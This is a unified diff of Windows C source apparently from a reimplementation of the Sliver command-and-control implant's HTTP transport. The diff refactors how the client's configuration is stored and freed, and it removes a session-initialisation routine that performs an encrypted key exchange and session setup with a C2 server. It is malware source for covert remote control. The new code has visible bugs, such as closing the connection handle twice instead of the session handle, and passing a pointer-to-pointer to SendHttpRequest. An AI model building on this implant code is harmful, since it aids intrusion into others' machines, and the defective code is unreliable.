@@ -686,100 +686,6 @@ VOID FreeHttpRequest
 	}
 }
 
-VOID FreeSliverHttpClient
-(
-	_In_ PSLIVER_HTTP_CLIENT pClient
-)
-{
-	DWORD i = 0;
-
-	if (pClient == NULL) {
-		return;
-	}
-
-	if (pClient->pSessionKey != NULL) {
-		FREE(pClient->pSessionKey);
-	}
-
-	for (i = 0; i < _countof(pClient->PollPaths); i++) {
-		if (pClient->PollPaths[i] != NULL) {
-			FREE(pClient->PollPaths[i]);
-		}
-	}
-
-	for (i = 0; i < _countof(pClient->PollFiles); i++) {
-		if (pClient->PollFiles[i] != NULL) {
-			FREE(pClient->PollFiles[i]);
-		}
-	}
-
-	for (i = 0; i < _countof(pClient->SessionPaths); i++) {
-		if (pClient->SessionPaths[i] != NULL) {
-			FREE(pClient->SessionPaths[i]);
-		}
-	}
-
-	for (i = 0; i < _countof(pClient->SessionFiles); i++) {
-		if (pClient->SessionFiles[i] != NULL) {
-			FREE(pClient->SessionFiles[i]);
-		}
-	}
-
-	for (i = 0; i < _countof(pClient->ClosePaths); i++) {
-		if (pClient->ClosePaths[i] != NULL) {
-			FREE(pClient->ClosePaths[i]);
-		}
-	}
-
-	for (i = 0; i < _countof(pClient->CloseFiles); i++) {
-		if (pClient->CloseFiles[i] != NULL) {
-			FREE(pClient->CloseFiles[i]);
-		}
-	}
-
-	if (pClient->lpHostName != NULL) {
-		FREE(pClient->lpHostName);
-	}
-
-	if (pClient->lpRecipientPubKey != NULL) {
-		FREE(pClient->lpRecipientPubKey);
-	}
-
-	if (pClient->lpPeerPubKey != NULL) {
-		FREE(pClient->lpPeerPubKey);
-	}
-
-	if (pClient->lpPeerPrivKey != NULL) {
-		FREE(pClient->lpPeerPrivKey);
-	}
-
-	if (pClient->HttpConfig.lpUserAgent != NULL) {
-		FREE(pClient->HttpConfig.lpUserAgent);
-	}
-
-	if (pClient->HttpConfig.lpAccessToken != NULL) {
-		FREE(pClient->HttpConfig.lpAccessToken);
-	}
-
-	for (i = 0; i < _countof(pClient->HttpConfig.AdditionalHeaders); i++) {
-		if (pClient->HttpConfig.AdditionalHeaders[i] != NULL) {
-			FREE(pClient->HttpConfig.AdditionalHeaders[i]);
-		}
-	}
-
-	if (pClient->lpServerMinisignPublicKey != NULL) {
-		FREE(pClient->lpServerMinisignPublicKey);
-	}
-
-	if (pClient->lpCookiePrefix != NULL) {
-		FREE(pClient->lpCookiePrefix);
-	}
-
-	FreeWebProxy(pClient->HttpConfig.pProxyConfig);
-	FreeHttpClient(pClient->pHttpClient);
-	FREE(pClient);
-}
-
 PHTTP_REQUEST CreateHttpRequest
 (
 	_In_ PHTTP_CONFIG pHttpConfig,
@@ -934,18 +840,19 @@ PSLIVER_HTTP_CLIENT HttpInit()
 	DWORD i = 0;
 
 	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
-	pResult->HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
+	pResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
+	pResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
 	lpProxy = GetProxyConfig();
 	if (lpProxy != NULL) {
 		if (!lstrcmpA(lpProxy, "auto")) {
-			pResult->HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
+			pResult->pHttpConfig->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
 		}
 		else {
-			pResult->HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
+			pResult->pHttpConfig->pProxyConfig = ProxyInit(UserProvided, lpProxy);
 		}
 	}
 
-	pResult->HttpConfig.dwNumberOfAttemps = 10;
+	pResult->pHttpConfig->dwNumberOfAttemps = 10;
 	pResult->cPollPaths = _countof(PollPaths);
 	for (i = 0; i < _countof(PollPaths); i++) {
 		pResult->PollPaths[i] = DuplicateStrA(PollPaths[i], 0);
@@ -1018,7 +925,7 @@ PENVELOPE HttpRecv
 	}
 
 	pUri = UriInit(lpUri);
-	pResp = SendHttpRequest(&pHttpClient->HttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "GET", NULL, NULL, 0, FALSE, TRUE);
+	pResp = SendHttpRequest(&pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "GET", NULL, NULL, 0, FALSE, TRUE);
 	if (pResp == NULL) {
 		goto CLEANUP;
 	}
@@ -1087,7 +994,7 @@ BOOL HttpSend
 	}
 
 	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
-	pResp = SendHttpRequest(&pHttpClient->HttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
+	pResp = SendHttpRequest(&pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
 	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
 		goto CLEANUP;
 	}
@@ -1110,6 +1017,117 @@ CLEANUP:
 	return Result;
 }
 
+BOOL HttpClose
+(
+	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
+)
+{
+	PHTTP_CLIENT pHttpClient = NULL;
+
+	if (pSliverHttpClient != NULL && pSliverHttpClient->pHttpClient != NULL) {
+		pHttpClient = pSliverHttpClient->pHttpClient;
+		if (pHttpClient->hConnection != NULL) {
+			WinHttpCloseHandle(pHttpClient->hConnection);
+			pHttpClient->hConnection = NULL;
+		}
+
+		if (pHttpClient->pHttpSession->hSession != NULL) {
+			WinHttpCloseHandle(pHttpClient->hConnection);
+			pHttpClient->hConnection = NULL;
+		}
+	}
+
+	return TRUE;
+}
+
+VOID FreeHttpConfig
+(
+	_In_ PHTTP_CONFIG pHttpConfig
+)
+{
+	DWORD i = 0;
+	if (pHttpConfig != NULL) {
+		if (pHttpConfig->lpUserAgent != NULL) {
+			FREE(pHttpConfig->lpUserAgent);
+		}
+
+		if (pHttpConfig->lpAccessToken != NULL) {
+			FREE(pHttpConfig->lpAccessToken);
+		}
+
+		for (i = 0; i < _countof(pHttpConfig->AdditionalHeaders); i++) {
+			if (pHttpConfig->AdditionalHeaders[i] != NULL) {
+				FREE(pHttpConfig->AdditionalHeaders[i]);
+			}
+		}
+
+		FREE(pHttpConfig);
+	}
+}
+
+BOOL HttpCleanup
+(
+	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
+)
+{
+	DWORD i = 0;
+	if (pSliverHttpClient != NULL) {
+		if (pSliverHttpClient->lpCookiePrefix != NULL) {
+			FREE(pSliverHttpClient->lpCookiePrefix);
+		}
+
+		if (pSliverHttpClient->lpPathPrefix != NULL) {
+			FREE(pSliverHttpClient->lpPathPrefix);
+		}
+
+		if (pSliverHttpClient->lpHostName != NULL) {
+			FREE(pSliverHttpClient->lpHostName);
+		}
+
+		for (i = 0; i < _countof(pSliverHttpClient->PollPaths); i++) {
+			if (pSliverHttpClient->PollPaths[i] != NULL) {
+				FREE(pSliverHttpClient->PollPaths[i]);
+			}
+		}
+
+		for (i = 0; i < _countof(pSliverHttpClient->PollFiles); i++) {
+			if (pSliverHttpClient->PollFiles[i] != NULL) {
+				FREE(pSliverHttpClient->PollFiles[i]);
+			}
+		}
+
+		for (i = 0; i < _countof(pSliverHttpClient->SessionPaths); i++) {
+			if (pSliverHttpClient->SessionPaths[i] != NULL) {
+				FREE(pSliverHttpClient->SessionPaths[i]);
+			}
+		}
+
+		for (i = 0; i < _countof(pSliverHttpClient->SessionFiles); i++) {
+			if (pSliverHttpClient->SessionFiles[i] != NULL) {
+				FREE(pSliverHttpClient->SessionFiles[i]);
+			}
+		}
+
+		for (i = 0; i < _countof(pSliverHttpClient->ClosePaths); i++) {
+			if (pSliverHttpClient->ClosePaths[i] != NULL) {
+				FREE(pSliverHttpClient->ClosePaths[i]);
+			}
+		}
+
+		for (i = 0; i < _countof(pSliverHttpClient->CloseFiles); i++) {
+			if (pSliverHttpClient->CloseFiles[i] != NULL) {
+				FREE(pSliverHttpClient->CloseFiles[i]);
+			}
+		}
+
+		FreeHttpConfig(pSliverHttpClient->pHttpConfig);
+		FreeHttpClient(pSliverHttpClient->pHttpClient);
+		FREE(pSliverHttpClient);
+	}
+
+	return TRUE;
+}
+
 BOOL HttpStart
 (
 	_In_ PGLOBAL_CONFIG pConfig,
@@ -1124,7 +1142,6 @@ BOOL HttpStart
 	PHTTP_RESP pResp = NULL;
 	PBUFFER pDecodedResp = NULL;
 	DWORD cbDecodedResp = 0;
-	PHTTP_CLIENT pHttpClient = NULL;
 	PWEB_PROXY pProxyConfig = NULL;
 	PBUFFER pSessionId = NULL;
 	PBYTE pEncryptedSessionInit = NULL;
@@ -1145,7 +1162,7 @@ BOOL HttpStart
 		goto CLEANUP;
 	}
 
-	pHttpClient->pHttpClient = HttpClientInit(pUri, pHttpClient->HttpConfig.pProxyConfig);
+	pHttpClient->pHttpClient = HttpClientInit(pUri, pHttpClient->pHttpConfig->pProxyConfig);
 	if (pHttpClient->pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -1157,7 +1174,7 @@ BOOL HttpStart
 	}
 
 	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	pResp = SendHttpRequest(&pHttpClient->HttpConfig, pHttpClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
+	pResp = SendHttpRequest(&pHttpClient->pHttpConfig, pHttpClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -1536,119 +1553,4 @@ CLEANUP:
 	}
 
 	return Result;
-}
-
-PSLIVER_HTTP_CLIENT SliverSessionInit
-(
-	_In_ LPSTR lpC2Url
-)
-{
-	LPSTR lpFullUri = NULL;
-	PURI pUri = NULL;
-	DWORD cbResp = 0;
-	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
-	LPSTR lpEncodedSessionKey = NULL;
-	BOOL bIsOk = FALSE;
-	PHTTP_RESP pResp = NULL;
-	PBUFFER pDecodedResp = NULL;
-	DWORD cbDecodedResp = 0;
-	PHTTP_CLIENT pHttpClient = NULL;
-	PWEB_PROXY pProxyConfig = NULL;
-	LPSTR lpSessionId = NULL;
-	DWORD cbSessionId = 0;
-	PBYTE pEncryptedSessionInit = NULL;
-	LPSTR lpRespData = NULL;
-	DWORD cbEncryptedSessionInit = 0;
-	PBYTE pMarshalledData = NULL;
-	DWORD dwSetCookieLength = 0;
-	WCHAR wszSetCookie[0x100];
-	LPWSTR lpTemp = NULL;
-
-	pSliverClient = SliverHttpClientInit(lpC2Url);
-	if (pSliverClient == NULL) {
-		goto CLEANUP;
-	}
-
-	lpFullUri = StartSessionURL(pSliverClient);
-	if (lpFullUri == NULL) {
-		goto CLEANUP;
-	}
-
-	pUri = UriInit(lpFullUri);
-	if (pUri == NULL) {
-		goto CLEANUP;
-	}
-
-	pSliverClient->pHttpClient = HttpClientInit(pUri, pSliverClient->HttpConfig.pProxyConfig);
-	if (pSliverClient->pHttpClient == NULL) {
-		goto CLEANUP;
-	}
-
-	pMarshalledData = ALLOC(CHACHA20_KEY_SIZE + 2);
-	pMarshalledData[0] = 10;
-	pMarshalledData[1] = CHACHA20_KEY_SIZE;
-	memcpy(pMarshalledData + 2, pSliverClient->pSessionKey, CHACHA20_KEY_SIZE);
-	pEncryptedSessionInit = AgeKeyExToServer(pSliverClient->lpRecipientPubKey, pSliverClient->lpPeerPrivKey, pSliverClient->lpPeerPubKey, pMarshalledData, CHACHA20_KEY_SIZE + 2, &cbEncryptedSessionInit);
-	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
-		goto CLEANUP;
-	}
-
-	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
-	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
-		goto CLEANUP;
-	}
-
-	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
-	pDecodedResp = SliverBase64Decode(lpRespData, &cbDecodedResp);
-	lpSessionId = SliverDecrypt(pSliverClient, pDecodedResp);
-	if (lpSessionId == NULL || cbSessionId == 0) {
-		goto CLEANUP;
-	}
-
-	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
-	dwSetCookieLength = sizeof(wszSetCookie);
-	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
-	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
-		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
-		goto CLEANUP;
-	}
-
-	lpTemp = StrChrW(wszSetCookie, L'=');
-	lpTemp[0] = L'\0';
-	pSliverClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
-	bIsOk = TRUE;
-CLEANUP:
-	if (!bIsOk) {
-		FreeSliverHttpClient(pSliverClient);
-		pSliverClient = NULL;
-	}
-
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
-	}
-
-	if (lpSessionId != NULL) {
-		FREE(lpSessionId);
-	}
-
-	if (lpEncodedSessionKey != NULL) {
-		FREE(lpEncodedSessionKey);
-	}
-
-	if (lpFullUri != NULL) {
-		FREE(lpFullUri);
-	}
-
-	if (pMarshalledData != NULL) {
-		FREE(pMarshalledData);
-	}
-
-	if (pEncryptedSessionInit != NULL) {
-		FREE(pEncryptedSessionInit);
-	}
-
-	FreeBuffer(pDecodedResp);
-	FreeHttpResp(pResp);
-	return pSliverClient;
 }
